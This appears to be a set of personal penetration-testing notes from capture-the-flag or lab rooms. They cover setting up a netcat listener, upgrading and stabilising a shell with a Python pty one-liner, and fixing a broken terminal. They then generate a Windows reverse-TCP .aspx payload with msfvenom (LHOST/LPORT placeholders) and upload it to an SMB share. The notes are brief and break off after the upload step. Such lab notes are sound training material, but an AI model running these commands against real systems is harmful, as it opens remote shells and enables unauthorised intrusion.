python3 -m http.server 8000 - from Cupid's Matchmaker
nc -lnvp port - listener from Speed Chatting

Upgrade the shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

To make the shell usable:
```
stty raw -echo; fg
```
To make the shell stable:
```
export TERM=xterm python3 -c 'import pty; pty.spawn("/bin/bash")'
```
The error message bash: fg: current: no such job occurs when you run the **fg** (foreground) command, but there are no background or suspended jobs for the shell to resume.
**Summary of what to try right now:**

1. Type **reset** and hit Enter.
2. If that doesn't work, type **exec bash** and hit Enter.
3. If you see weird characters when you type, try **ctrl + j** followed by **stty sane** and **ctrl + j**.

Reverse shell basics:
[Reverse Shell Cheat Sheet With Examples [100% Working] | GoLinuxCloud](https://www.golinuxcloud.com/create-reverse-shell-cheat-sheet/#what-are-reverse-shells-and-bind-shells)

Since this is a Windows machine I use **msfvenom** to create a reverse **.aspx** shell:

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<MY IP> LPORT=4444 -f aspx -o shell.aspx`

And then connect back over to the SMB share and upload it:

`put shell.aspx` and `dir`: